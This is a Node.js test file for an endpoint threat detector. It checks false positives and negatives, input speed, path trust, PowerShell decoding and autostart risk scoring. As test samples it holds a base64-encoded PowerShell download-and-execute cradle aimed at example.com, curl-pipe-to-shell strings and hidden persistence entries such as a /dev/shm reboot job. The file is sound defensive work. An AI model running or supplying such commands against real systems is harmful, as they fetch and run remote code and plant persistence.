// Guard endpoint detection, measured: every labelled sample in accuracy-corpus.mjs must come out
// right. A harmless sample that alerts is a false positive; an attack that is missed or
// under-rated is a false negative. Both fail the build, so accuracy cannot slip unnoticed.
import assert from 'node:assert/strict';
import { test } from 'node:test';

const detector = await import('./packages/dashboard/guard/endpoint-detect.mjs');
const { CORPUS, scoreCorpus } = await import('./packages/dashboard/guard/accuracy-corpus.mjs');
const { analyzePowershell, commandRisk, commandTrust, detectEndpoint, fileTrust, locate, normalizeCmd } = detector;

const describe = (r) =>
  `${r.sample.id}: got ${r.got}${r.sample.expect ? `, wanted ${r.sample.expect.rule} >= ${r.sample.expect.min}${r.sample.expect.max ? ` and nothing above ${r.sample.expect.max}` : ''}` : ''}${r.sample.why ? ` (${r.sample.why})` : ''}`;

test('the corpus is large enough to mean something and its ids are unique', () => {
  const ids = CORPUS.map((s) => s.id);
  assert.equal(new Set(ids).size, ids.length, 'duplicate sample id');
  const of = (label) => CORPUS.filter((s) => s.label === label).length;
  assert.ok(of('benign') >= 100, `benign samples: ${of('benign')}`);
  assert.ok(of('malicious') >= 120, `malicious samples: ${of('malicious')}`);
  assert.ok(of('policy') >= 8, `policy samples: ${of('policy')}`);
});

test('no harmless sample raises an alert (false positives)', () => {
  const { benign } = scoreCorpus(detector);
  assert.deepEqual(benign.falsePositives.map(describe), []);
});

test('every attack sample is caught at or above its severity (false negatives)', () => {
  const { malicious } = scoreCorpus(detector);
  assert.deepEqual(malicious.falseNegatives.map(describe), []);
});

test('behaviour that admins and attackers share is reported at the stated level, never higher', () => {
  const { policy } = scoreCorpus(detector);
  assert.deepEqual(policy.wrong.map(describe), []);
});

test('the whole corpus is judged in well under a second, and long hostile input stays fast', () => {
  const started = performance.now();
  scoreCorpus(detector);
  assert.ok(performance.now() - started < 1500, 'corpus took too long');
  const host = { id: 'gag_slow', name: 'H', os: 'windows' };
  const hostile = [
    `powershell -enc ${'A'.repeat(32_000)}`,
    `powershell ${"'+'".repeat(8000)}`,
    `cmd /c ${'c:\\a '.repeat(6000)}`,
    `${'c:\\'.repeat(10_000)}`,
    `schtasks /create /tr ${'\\\\srv\\share\\'.repeat(2500)}`,
    `curl ${'-o x '.repeat(6000)}`,
    `bash -c "${'curl x | '.repeat(3500)}"`,
    `${'[char]1+'.repeat(4000)}`,
    `rundll32 ${'a.dll,'.repeat(5000)}`,
  ];
  for (const cmdline of hostile) {
    const t = performance.now();
    detectEndpoint(
      [{ id: 'x', type: 'process.start', at: 1, host, process: { pid: 1, name: 'powershell.exe', cmdline } }],
      { orgId: 'o' },
    );
    commandRisk(cmdline);
    assert.ok(performance.now() - t < 500, `slow on ${cmdline.slice(0, 24)}…`);
  }
});

test('where a file lives decides how much it is trusted', () => {
  const cases = {
    'C:\\Program Files\\App\\a.exe': 'protected',
    'C:\\Program Files (x86)\\App\\a.exe': 'protected',
    'C:\\Windows\\System32\\svchost.exe': 'protected',
    '\\SystemRoot\\System32\\drivers\\x.sys': 'protected',
    '\\??\\C:\\Program Files\\McAfee\\x.sys': 'protected',
    'system32\\DRIVERS\\x.sys': 'protected',
    'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe': 'protected',
    'C:\\Windows\\Temp\\a.exe': 'temp',
    'C:\\Users\\amy\\AppData\\Local\\Temp\\a.exe': 'temp',
    'C:\\Users\\amy\\Downloads\\a.exe': 'temp',
    'C:\\Users\\Public\\a.exe': 'temp',
    'C:\\Users\\amy\\AppData\\Roaming\\a.exe': 'user',
    'C:\\ProgramData\\a.exe': 'user',
    'D:\\Tools\\a.exe': 'user',
    '\\\\fileserver\\share\\a.exe': 'remote',
    'notepad.exe': 'unknown',
    '/usr/local/bin/tool': 'protected',
    '/opt/app/bin/run': 'protected',
    '/tmp/x': 'temp',
    '/dev/shm/x': 'temp',
    '/home/amy/run.sh': 'user',
  };
  for (const [path, expected] of Object.entries(cases)) assert.equal(locate(path), expected, path);
});

test('PowerShell is judged on what it does, decoded first', () => {
  const enc = (s) => Buffer.from(s, 'utf16le').toString('base64');
  const of = (raw) => analyzePowershell(normalizeCmd(raw), raw);
  const harmless = of(`powershell -NoProfile -EncodedCommand ${enc('Get-Date | Out-String')}`);
  assert.equal(harmless.encoded, true);
  assert.equal(harmless.severity, null, 'encoding alone is not an alert');
  assert.equal(harmless.decoded, 'Get-Date | Out-String');
  const cradle = of(`powershell -e ${enc('iex (irm https://example.com/x)')}`);
  assert.equal(cradle.severity, 'critical');
  assert.deepEqual(
    cradle.findings.map((f) => f.id),
    ['cradle'],
  );
  // Every spelling PowerShell accepts for the flag, and an en dash instead of a hyphen.
  for (const flag of ['-e', '-ec', '-enc', '-EncodedCommand', '-encodedc', '\u2013enc'])
    assert.equal(of(`powershell ${flag} ${enc('iex (irm https://example.com/x)')}`).severity, 'critical', flag);
  assert.equal(of('powershell -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1').severity, null);
});

test('an autostart command is judged on what it starts and who signed it', () => {
  const level = (cmd, info) => commandRisk(cmd, info).level;
  assert.equal(level('"C:\\Program Files\\App\\app.exe" --background'), 'none');
  assert.equal(level('C:\\Program Files\\App With Spaces\\app.exe /s'), 'none', 'unquoted path with spaces');
  assert.equal(level('C:\\Users\\amy\\AppData\\Local\\App\\app.exe'), 'medium');
  assert.equal(level('C:\\Users\\amy\\AppData\\Local\\App\\app.exe', { signer: { status: 'valid' } }), 'none');
  assert.equal(level('C:\\Users\\amy\\AppData\\Local\\App\\app.exe', { signer: { status: 'unsigned' } }), 'high');
  assert.equal(
    level('C:\\Users\\amy\\AppData\\Local\\Programs\\app\\app.exe', { signer: { status: 'unsigned' } }),
    'medium',
  );
  assert.equal(level('C:\\Users\\amy\\AppData\\Local\\Temp\\a.exe', { signer: { status: 'valid' } }), 'medium');
  assert.equal(level('C:\\Users\\amy\\AppData\\Local\\Temp\\a.exe'), 'high');
  assert.equal(
    level('"C:\\Users\\amy\\AppData\\Local\\Microsoft\\WindowsApps\\Teams_8wekyb3d8bbwe\\ms-teams.exe"', {
      resolved: 'C:\\Program Files\\WindowsApps\\MSTeams_24.1_x64\\ms-teams.exe',
    }),
    'none',
    'a Store app shortcut that points into a protected folder',
  );
  assert.equal(
    level('C:\\WINDOWS\\system32\\cmd.exe /q /c del /q "C:\\Users\\amy\\AppData\\Local\\App\\old.exe"'),
    'none',
  );
  assert.equal(level('C:\\WINDOWS\\system32\\cmd.exe /c "C:\\Users\\amy\\AppData\\Local\\App\\run.bat"'), 'medium');
  assert.equal(level('0 3 * * * root /usr/local/bin/backup.sh', { os: 'linux' }), 'none');
  assert.equal(
    level('0 3 * * * root /usr/bin/rsync -a /home/data /mnt/backup', { os: 'linux' }),
    'none',
    'arguments are data',
  );
  assert.equal(level('*/5 * * * * /home/deploy/check.sh', { os: 'linux', packageOwner: 'deploy-tools' }), 'none');
  assert.equal(level('@reboot /dev/shm/.d', { os: 'linux' }), 'high');
  assert.match(
    commandRisk('wscript.exe "C:\\Users\\amy\\AppData\\Roaming\\a.vbs"').why,
    /a file any user account can change/,
  );
});

test('marking something as expected silences that exact command or file, and nothing critical', () => {
  const host = { id: 'gag_t', name: 'PC', os: 'windows' };
  const launcher = (user) => ({
    id: `t-${user}`,
    type: 'persistence.created',
    at: 1000,
    host,
    persistence: {
      kind: 'scheduled-task',
      name: '\\LocalAgent',
      command: `wscript.exe //B //Nologo "C:\\Users\\${user}\\AppData\\Roaming\\LocalAgent\\bin\\launcher.vbs"`,
    },
  });
  const first = detectEndpoint([launcher('amy')], { orgId: 'o' }).alerts[0];
  assert.equal(first.severity, 'high');
  assert.equal(first.trust.fp, fileTrust('C:\\Users\\amy\\AppData\\Roaming\\LocalAgent\\bin\\launcher.vbs').fp);
  assert.equal(
    first.trust.fp,
    fileTrust('c:\\users\\BOB\\appdata\\roaming\\localagent\\bin\\launcher.vbs').fp,
    'the same file in any profile',
  );
  const org = { rdp: [], trusted: [{ fp: first.trust.fp }] };
  assert.equal(detectEndpoint([launcher('bob')], { orgId: 'o', org }).alerts.length, 0);
  // The same fingerprint covers the script being run, not only its autostart entry.
  const ran = {
    id: 'r1',
    type: 'process.start',
    at: 2000,
    host,
    process: {
      pid: 9,
      name: 'wscript.exe',
      cmdline: 'wscript.exe //B "C:\\Users\\amy\\AppData\\Roaming\\LocalAgent\\bin\\launcher.vbs"',
    },
  };
  assert.equal(detectEndpoint([ran], { orgId: 'o' }).alerts[0].rule, 'risky-script');
  assert.equal(detectEndpoint([ran], { orgId: 'o', org }).alerts.length, 0);
  // Version numbers and ids do not make it a different command.
  assert.equal(
    commandTrust('app.exe --pid 4012 --v 1.40.161', '').fp,
    commandTrust('app.exe --pid 977 --v 1.41.20', '').fp,
  );
  assert.notEqual(commandTrust('app.exe --run a', '').fp, commandTrust('app.exe --run b', '').fp);
  // Critical alerts carry no fingerprint, so they can never be silenced this way.
  for (const sample of CORPUS.filter((s) => s.label === 'malicious' && s.events)) {
    for (const alert of detectEndpoint(structuredClone(sample.events), { orgId: 'o' }).alerts)
      if (alert.severity === 'critical') assert.equal(alert.trust, undefined, `${sample.id}: ${alert.rule}`);
  }
});
